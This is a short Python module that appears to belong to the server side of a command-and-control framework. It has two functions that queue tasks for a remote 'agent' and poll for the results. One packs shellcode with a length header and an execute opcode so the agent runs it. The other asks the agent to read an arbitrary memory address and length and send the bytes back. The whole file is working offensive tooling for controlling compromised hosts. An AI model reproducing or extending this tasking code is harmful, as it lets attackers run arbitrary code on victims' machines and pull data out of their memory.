from models.request import Request
from routes.anon.agent import handle_msg_type
import time

def send_and_wait(agent_id, shellcode, debug=False):
    shell_len = len(shellcode).to_bytes(8, byteorder="little")
    shellcode = bytearray(shell_len + shellcode) # Shellcode size
    shellcode.insert(0, 0x01) # Exec
    if debug:
        shellcode[-1] = 0xCC
    req_obj = Request(agent_id, shellcode)
    while True:
        db_session, request_obj = Request.by_id_lock(req_obj.id)
        if request_obj is None:
            break
        if request_obj.response != None:
            break
        db_session.remove()
        time.sleep(0.5)
    response_data = handle_msg_type(request_obj.id)
    return response_data

def read_from_agent(agent_id, memory, length):
    memory_bytes = bytearray(memory.to_bytes(8, byteorder="little"))
    length_bytes = bytearray(length.to_bytes(8, byteorder="little"))
    data_blob = memory_bytes + length_bytes
    data_blob.insert(0, 0x2) # Read
    req_obj = Request(agent_id, data_blob)
    while True:
        db_session, request_obj = Request.by_id_lock(req_obj.id)
        if request_obj is None:
            break
        if request_obj.response != None:
            break
        db_session.remove()
        time.sleep(0.5)
    response_data = handle_msg_type(request_obj.id)
    return response_data